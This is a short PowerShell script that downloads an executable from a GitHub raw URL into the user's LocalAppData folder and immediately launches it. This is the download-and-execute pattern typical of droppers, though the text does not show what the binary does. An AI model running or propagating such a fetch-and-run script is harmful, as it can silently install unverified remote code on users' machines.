$applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
$path = "$env:LOCALAPPDATA\Aplicatie.exe"

Invoke-WebRequest -Uri $applicatie -OutFile $path

Start-Sleep -Seconds 1

Start-Process -FilePath $path
